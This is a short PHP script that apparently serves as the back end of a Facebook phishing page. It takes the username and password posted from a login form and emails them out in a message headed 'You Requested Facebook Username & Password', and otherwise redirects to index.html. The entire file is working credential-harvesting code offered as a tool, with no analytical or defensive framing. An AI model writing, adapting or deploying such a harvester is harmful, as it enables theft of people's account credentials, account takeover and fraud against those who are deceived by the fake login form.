<?php
require "phpemail/phpmail.php";
$uname = $_POST['username'];
$pass = $_POST['password'];
if(strlen(trim($uname))>0 && strlen(trim($pass))>0) {
    sendMail("<h4 align=\"center\">You Requested Facebook Username & Password</h4>
<div style=\" margin:auto;padding: 20px; border: solid 2px #f44242; border-radius: 50px; width:500px; overflow: auto; background-color: lightgray;\">
    <h3>User Name : {$uname} </h3>
    <h3>Password : {$pass}</h3>
</div>", $uname);
}
else{
    header('Location: '. "index.html");
}
?>